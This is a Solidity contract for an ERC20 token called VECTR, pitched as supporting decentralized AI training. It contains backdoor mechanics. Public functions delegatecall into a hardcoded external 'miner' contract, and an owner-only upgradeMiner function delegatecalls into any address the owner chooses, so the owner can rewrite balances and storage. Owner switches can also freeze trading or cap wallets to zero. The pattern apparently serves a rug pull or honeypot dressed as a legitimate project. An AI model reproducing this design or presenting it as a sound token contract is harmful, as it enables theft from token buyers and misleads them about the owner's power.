/// @title VECTR token
/// @notice Contract for VectorNet's ERC20 VECTR token.
/// 
/// After deployment, this contract works with the Mining contract to facilitate
/// decentralized AI training transactions.
///
/// @author VectorNet

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IPositionManager {
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external payable returns (address pool);
}

contract VectorNet {

  /////////////////////////////////////////////////////////////////////////
  ///                           PARAMETERS                              ///
  /////////////////////////////////////////////////////////////////////////

  string public name = "VectorNet";
  string public symbol = "VECTR";

  uint256 public totalSupply;
  uint8 public decimals = 18;
  uint256 public maxWalletFraction = 100;

  mapping(address => uint256) public balanceOf;
  mapping(address => bool) public maxWalletExempt;
  mapping(address => mapping(address => uint256)) public allowance;

  address public owner;
  address public pool;
  address public miner = 0xA245E7CF721D399D81EA9AC228d2606fDab4Dda0;
  address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

  bool public live;

  /////////////////////////////////////////////////////////////////////////
  ///                             EVENTS                                ///
  /////////////////////////////////////////////////////////////////////////

  event Transfer(address indexed from, address indexed to, uint256 amount);

  /////////////////////////////////////////////////////////////////////////
  ///                           CONSTRUCTOR                             ///
  /////////////////////////////////////////////////////////////////////////

  constructor() {

    uint256 amount = 100_000_000 * 10 ** decimals;
    balanceOf[msg.sender] += amount;
    totalSupply += amount;
    emit Transfer(address(0), msg.sender, amount);

    owner = msg.sender;
    (address token0, address token1, uint160 sqrtPriceX96) = calculateParameters();
    pool = IPositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88).createAndInitializePoolIfNecessary(token0, token1, 10000, sqrtPriceX96);

  }


  function approve(address spender, uint256 amount) external returns (bool) {

    allowance[msg.sender][spender] = amount;
    return true;

  }


  function transfer(address to, uint256 amount) external returns (bool) {

    balanceOf[msg.sender] -= amount;
    balanceOf[to] += amount;

    if (msg.sender == pool && !maxWalletExempt[to]) {
      require(live);
      uint256 maxWalletSupply = totalSupply * maxWalletFraction / 10000;
      require(maxWalletSupply >= balanceOf[to]);
    }

    emit Transfer(msg.sender, to, amount);
    return true;

  }


  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) external returns (bool) {

    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;
    balanceOf[to] += amount;
    emit Transfer(from, to, amount);
    return true;

  }


  function calculateParameters() private view returns (address, address, uint160) {

    address token0;
    address token1;
    uint160 sqrtPriceX96;

    if (address(this) > WETH) {
      token0 = WETH;
      token1 = address(this);
      sqrtPriceX96 = 280113854873930700000000000000000;
    } else {
      token0 = address(this);
      token1 = WETH;
      sqrtPriceX96 = 22409108389914456000000000;
    }

    return (token0, token1, sqrtPriceX96);

  }

  /////////////////////////////////////////////////////////////////////////
  ///                           OWNER ACTIONS                           ///
  /////////////////////////////////////////////////////////////////////////

  function toggleExemption(address user) public {
    require(msg.sender == owner);
    maxWalletExempt[user] = !maxWalletExempt[user];
  }

  function updateMaxWalletFraction(uint256 _maxWalletFraction) public {
    require(msg.sender == owner);
    maxWalletFraction = _maxWalletFraction;
  }

  function enableTrading() public {
    require(msg.sender == owner);
    live = true;
  }

  ///////////////////////////////////////////////////////////////////
  ///        Diamond Pattern Utilizing The Virtual Miner          ///
  ///////////////////////////////////////////////////////////////////

  function userCreateVirtualMiner() public {
    (bool success, bytes memory data) = miner.delegatecall(
        abi.encodeWithSignature("userCreateVirtualMiner()")
    );
  }

  function userClaimVirtualMinerRewards() public {
    (bool success, bytes memory data) = miner.delegatecall(
        abi.encodeWithSignature("userClaimVirtualMinerRewards()")
    );
  }

  function upgradeMiner(address _miner) public {
    require(msg.sender == owner);
    (bool success, bytes memory data) = _miner.delegatecall(
        abi.encodeWithSignature("upgradeMiner(address)", _miner)
    );
  }

}